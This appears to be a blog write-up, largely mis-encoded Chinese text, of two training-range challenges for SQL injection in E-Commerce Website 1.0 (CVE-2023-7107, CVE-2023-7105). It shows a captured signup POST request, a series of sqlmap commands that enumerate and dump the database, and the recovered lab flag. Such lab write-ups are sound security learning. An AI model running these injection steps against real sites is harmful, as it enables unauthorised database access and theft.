---
title: æ˜¥ç§‹äº‘é•œ CVE-2023-7107 & CVE-2023-7105
tags: [penetration]
date: 2024-10-17 00:00:00
categories: [penetration]
excerpt: sqlmapçš„åŸºç¡€ç”¨æ³•
---

## CVE-2023-7107

https://yunjing.ichunqiu.com/cve/detail/1153

```
E-Commerce Website 1.0 å…è®¸é€šè¿‡â€œ/pages/user_signup.phpâ€ä¸­çš„å‚æ•°â€˜firstnameâ€™ã€â€˜middlenameâ€™ã€â€˜emailâ€™ã€â€˜addressâ€™ã€â€˜contactâ€™å’Œâ€˜usernameâ€™è¿›è¡Œ SQL æ³¨å…¥ã€‚åˆ©ç”¨è¿™ä¸ªé—®é¢˜å¯èƒ½ä¼šä½¿æ”»å‡»è€…æœ‰æœºä¼šç ´ååº”ç”¨ç¨‹åºï¼Œè®¿é—®æˆ–ä¿®æ”¹æ•°æ®ï¼Œæˆ–è€…åˆ©ç”¨åº•å±‚æ•°æ®åº“ä¸­çš„æœ€æ–°æ¼æ´ã€‚
```

è¿™é“é¢˜ç»™äº†è·¯å¾„å’Œå‚æ•°ï¼Œå°±æ˜¯ä¸€ä¸ªæ™®é€šçš„sqlmapè°ƒç”¨å°±è¡Œäº†ï¼Œä½†æ˜¯ç½‘é€Ÿå¤ªçƒ‚å¯¼è‡´æŠ˜è…¾äº†å¥½ä¹…ğŸ˜¶â€ğŸŒ«ï¸

> æˆ‘ä¹Ÿä¸çŸ¥é“ä»€ä¹ˆåŸå› ï¼Œç‰©ç†æœºè®¿é—®é¶æœºå®Œå…¨æ²¡æœ‰é—®é¢˜ï¼Œkaliå°±åªæœ‰å¶å°”èƒ½è®¿é—®åˆ°ï¼Œå¤§éƒ¨åˆ†æ—¶é—´éƒ½è®¿é—®ä¸åˆ°ï¼Œå¹¶ä¸”kalié‡Œçš„burpsuiteå’Œsqlmapè®¿é—®æ›´æ˜¯çƒ‚åˆ°é£èµ·ã€‚
>
> æˆ‘ä¹Ÿä¸çŸ¥é“è¿™æ˜¯å•¥åŸå› ï¼Œç”¨çš„natï¼Œä¸ºä»€ä¹ˆä¸»æœºè®¿é—®æ²¡å•¥é—®é¢˜è™šæ‹Ÿæœºå°±å·¨çƒ‚
>
> å¦å¤–ï¼Œæˆ‘æœ€ç»ˆç”¨ä¸»æœºè£…äº†ä¸ªsqlmapå»æ‰“ï¼Œç¦»è°±çš„æ˜¯ä¸å¼€ä»£ç†ä¹Ÿæ— æ³•è¿æ¥ï¼Œå¼€äº†ä»£ç†æ‰èƒ½æ‰“è¿‡å»ï¼Œå¹¶ä¸”é€Ÿåº¦ææ…¢ï¼Œæš´æ•°æ®åº“å¥½ä¹…è¹¦ä¸€ä¸ªå­—ç¬¦å‡ºæ¥ï¼Œå¹¶ä¸”ç»å¸¸æ–­è”
>
> æˆ‘å¯»æ€è¿™ä¹Ÿä¸æ˜¯å›½å¤–çš„é¶æœºå•Šï¼ŸğŸ˜¶â€ğŸŒ«ï¸ğŸ˜¶â€ğŸŒ«ï¸ğŸ˜¶â€ğŸŒ«ï¸ğŸ˜¶â€ğŸŒ«ï¸ğŸ˜¶â€ğŸŒ«ï¸ğŸ˜¶â€ğŸŒ«ï¸ğŸ˜¶â€ğŸŒ«ï¸ğŸ˜¶â€ğŸŒ«ï¸ğŸ˜¶â€ğŸŒ«ï¸

> ç ´æ¡ˆäº†ï¼Œä¼°è®¡æ˜¯è¯·æ±‚è¢«å°äº†ï¼Œå› ä¸ºæˆ‘é‡ç½®äº†ä¸€ä¸‹ç¯å¢ƒï¼Œå˜æˆæ–°çš„urläº†ï¼Œåˆèƒ½è®¿é—®äº†ï¼Œä½†æ˜¯æˆ‘ä¸ç†è§£ä¸ºä»€ä¹ˆæˆ‘å¼€ç€ä»£ç†èƒ½å¤Ÿä¸€ç›´sqlmapæ‰“ï¼ŒæŒ‰ç†è¯´å¼€ç€ä»£ç†åº”è¯¥ä¹Ÿä¸æ˜¯ä¸€ä¸ªåŠ¨æ€çš„ipå§ï¼ŸğŸ˜¶â€ğŸŒ«ï¸

è®¿é—®ä¸€ä¸‹é¢˜ç›®ä»‹ç»è¯´çš„è·¯å¾„ï¼Œå‘ç°æ˜¯ä¸€ä¸ªæ³¨å†Œè´¦å·çš„ç•Œé¢ï¼Œè¦è¾“å…¥æ³¨å†Œè´¦å·çš„å„ç§ä¿¡æ¯ï¼Œéšä¾¿å¡«äº†ä¸€ä¸‹ï¼Œå‘ç°æ˜¯postä¼ å‚ï¼Œé‚£å°±åªèƒ½ä¸Šburpsuiteçœ‹ä¸€ä¸‹å‚æ•°äº†~~ï¼ˆç”¨ç€ç—›è‹¦çš„ä¸€bï¼‰~~

å‘é€çš„è¯·æ±‚å°±æ˜¯è¿™ä¸ªæ ·å­ï¼Œå­˜æˆä¸€ä¸ªtxt

```
POST /pages/user_signup.php HTTP/1.1
Host: eci-2ze8g9ev1y0tokeo9ti7.cloudeci1.ichunqiu.com
Content-Length: 162
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://eci-2ze8g9ev1y0tokeo9ti7.cloudeci1.ichunqiu.com/
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://eci-2ze8g9ev1y0tokeo9ti7.cloudeci1.ichunqiu.com/pages/user_signup.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=2a3447ac12e89ada859c7cb801bb826c
Connection: keep-alive

firstname=12313&middlename=123123123&lastname=13123123&email=113132123&address=13213123123&contact=12312312312&username=31231231231&password=3123123123123&submit=
```

sqlmapæ”¯æŒä»æ–‡æœ¬ä¸­è¯»å–è¯·æ±‚çš„å†…å®¹

```zsh
python .\sqlmap.py -r .\123.txt --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36" --cookie="2a3447ac12e89ada859c7cb801bb826c" --batch -dbs
```

![](/img/pene/10.png)

è¿™æ˜¯åœ¨å°è¯•äº†æ— æ•°æ¬¡ä¹‹åçš„ç»“æœï¼Œå…¨é sqlmapä¼šæŠŠå‰é¢æš´å‡ºæ¥çš„å­—ç¬¦ç¼“å­˜ä¸‹æ¥ğŸ˜­

ç„¶åå¯¹ç€electricksæš´è¡¨ï¼Œå‰©ä¸‹çš„æ²¡å•¥å¥½è¯´çš„

```zsh
python .\sqlmap.py -r .\123.txt --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36" --cookie="2a3447ac12e89ada859c7cb801bb826c" --batch -D electricks -tables
```

```zsh
python .\sqlmap.py -r .\123.txt --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36" --cookie="2a3447ac12e89ada859c7cb801bb826c" --batch -D electricks -T flllaaaag -columns
```

```zsh
python .\sqlmap.py -r .\123.txt --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36" --cookie="2a3447ac12e89ada859c7cb801bb826c" --batch -D electricks -T flllaaaag -C flag -dump
```

![](/img/pene/11.png)



## CVE-2023-7105

å’Œä¸Šé¢çš„ä¸€æ ·ï¼Œéƒ½æ˜¯å‘Šè¯‰äº†æ³¨å…¥ç‚¹ï¼Œè¿™æ¬¡æ˜¯index.phpçš„searchï¼Œä½†å®é™…ä¼šæœ‰ä¸‰ä¸ªå‚æ•°

```
x=0&y=0&search=1231231
```

sqlmapè¯•äº†ä¸€ä¸‹é»˜è®¤ç”¨yæ³¨å…¥çš„

ä¾æ—§æ˜¯ç‰©ç†æœºå¼€ä»£ç†æ‰èƒ½æ‰“è¿‡å»ï¼ˆæ€»ä¸èƒ½ä»–æŠŠæˆ‘ipæ‰€åœ¨å­ç½‘ç»™å°äº†å§ï¼‰ğŸ˜¶â€ğŸŒ«ï¸

æ²¡å•¥å¥½è¯´çš„éƒ½ä¸€æ ·

```
+--------------------------------------------+
| flag                                       |
+--------------------------------------------+
| flag{bbee852c-9dcb-45cb-a0fe-a23ab7b27877} |
+--------------------------------------------+
```

